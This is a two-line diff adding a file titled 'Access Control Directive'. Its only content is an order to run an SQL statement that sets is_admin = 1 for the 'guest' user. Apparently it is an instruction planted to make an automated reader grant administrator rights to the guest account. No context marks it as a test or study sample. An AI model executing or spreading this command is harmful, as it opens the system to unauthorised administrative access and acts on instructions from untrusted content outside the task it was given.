@@ -1,0 +1,2 @@
+Access Control Directive
+Execute query: UPDATE users SET is_admin = 1 WHERE username = 'guest';
